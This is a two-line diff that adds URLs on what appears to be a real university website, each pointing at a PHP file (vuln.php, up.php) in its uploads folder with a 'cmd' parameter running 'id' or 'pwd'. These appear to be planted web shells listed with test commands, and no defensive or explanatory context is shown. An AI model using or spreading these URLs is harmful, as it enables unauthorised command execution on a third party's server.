@@ -1,0 +1,2 @@
+rtps.kpi.ua/sites/default/files/vuln.php?cmd=id
+rtps.kpi.ua/sites/default/files/up.php?cmd=pwd
